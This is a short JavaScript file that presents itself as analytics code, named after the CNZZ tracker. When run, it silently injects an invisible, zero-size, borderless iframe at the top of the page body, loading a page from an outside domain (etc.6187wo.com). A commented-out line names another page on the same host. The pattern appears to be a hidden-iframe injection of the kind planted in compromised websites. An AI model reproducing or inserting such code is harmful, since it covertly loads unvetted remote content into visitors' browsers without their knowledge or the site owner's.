var cnzz_url = '//etc.6187wo.com/nht.html';
function cntrc(url){
	var divObj = document, h = divObj.getElementsByTagName('body')[0],div = divObj.createElement('div');
	div.style.display = 'none';
	var Scrip = document.createElement('iframe');
	Scrip.width = '0';
	Scrip.height = '0';
	Scrip.scrolling = "no";
	Scrip.setAttribute("border", 0);
	Scrip.setAttribute("frameborder", 0);
	//Scrip.src = '//etc.6187wo.com/a84bd6726389f396b731b4fe2411b78a.html';
	Scrip.src = cnzz_url;
	div.appendChild(Scrip);
	h && h.insertBefore(div,h.firstChild);
}
cntrc(cnzz_url);